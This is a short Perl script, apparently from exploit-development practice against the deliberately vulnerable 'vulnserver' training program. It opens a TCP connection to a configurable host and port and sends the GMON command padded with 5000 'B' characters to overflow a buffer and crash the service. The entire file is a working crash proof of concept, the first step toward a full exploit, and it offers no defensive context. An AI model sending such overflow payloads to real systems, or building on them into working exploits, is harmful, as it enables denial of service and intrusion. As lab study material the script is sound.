#!/usr/bin/perl
use IO::Socket; #Its load the standard socket library

$ipAddr = "192.168.122.101";  #default address
$ipPort = "9999";            #default port

if ($ARGV[1] ne '')
{
  $ipAddr = "$ARGV[0]";
  $ipPort = "$ARGV[1]";
}

$command = "GMON /.:/";     #commond that we want to send to vulnserver
$command .= "B" x 5000;

$socket = IO::Socket::INET->new(
  Proto=>"tcp",
  PeerAddr=>$ipAddr,
  PeerPort=>$ipPort) or die "Cannot connect to $ipAddr $ipPort";

$socket->recv($returnedData, 1024); #revice 1024 byte from server
print $returnedData;

$socket->send($command); #send the command
